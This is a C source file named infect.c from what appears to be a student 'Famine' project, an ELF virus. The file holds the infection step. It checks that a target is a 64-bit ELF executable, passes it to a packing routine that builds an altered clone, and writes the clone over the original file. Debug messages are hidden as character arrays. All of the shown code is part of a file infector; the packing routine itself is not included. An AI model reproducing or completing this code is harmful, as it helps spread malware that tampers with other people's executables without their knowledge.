/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/07 11:56:00 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <linux/elf.h>
#include "infect.h"
#include "syscall.h"
#include "accessors.h"
#include "errors.h"
#include "utils.h"

static bool	elf64_identifier(const Elf64_Ehdr *hdr, \
			struct endians_pointer *endians)
{
	const char elfmag[4] = {ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3};

	if (ft_memcmp(hdr->e_ident, elfmag, SELFMAG) != 0 // wrong Magic
	|| hdr->e_ident[EI_CLASS] != ELFCLASS64           // not 64bit
	|| hdr->e_entry == 0                              // no entry point
	|| hdr->e_phoff == 0                              // no program hdr table
	|| hdr->e_shoff == 0)                             // no section hdr table
		return false;

	// set endian for the future
	set_endian(endians, hdr->e_ident[EI_DATA] == ELFDATA2MSB);

	return true;
}

inline bool	infect_if_candidate(const char *file)
{
	struct famine	food;
	Elf64_Ehdr	elf64_hdr;
	int		fd = famine_open(file, O_RDONLY);

#ifdef DEBUG
	char e0[] = {'c','a','n','n','o','t',' ','o','p','e','n','\0'};
	char e1[] = {'r','e','a','d',' ','e','l','f','6','4',' ','h','e','a','d','e','r',' ','f','a','i','l','e','d','\0'};
	char e2[] = {'n','o','t',' ','e','l','f','6','4',' ','e','x','e','c','u','t','a','b','l','e','\0'};
	char e3[] = {'i','n','f','e','c','t','_','i','f','_','c','a','n','d','i','d','a','t','e','\0'};
#endif
	if (fd < 0)
	{
		return errors(ERR_SYS, e0);
	}
	if (famine_read(fd, &elf64_hdr, sizeof(elf64_hdr)) < (ssize_t)sizeof(elf64_hdr))
	{
		famine_close(fd);
		return errors(ERR_USAGE, e1);
	}
	if (elf64_identifier(&elf64_hdr, &food.endians) == false)
	{
		famine_close(fd);
		return errors(ERR_USAGE, e2);
	}
	famine_close(fd);

	if (!original_accessor(&food.original_safe, file))
		return errors(ERR_THROW, e3);

	if (!clone_accessor(&food.clone_safe, food.original_safe.filesize))
		return errors(ERR_THROW, e3);

	if (!elf64_packer(food, food.original_safe.filesize))
		return errors(ERR_THROW, e3);

	write_clone_file(food.clone_safe, file);

	free_accessor(&food.original_safe);
	free_accessor(&food.clone_safe);

	return true;
}
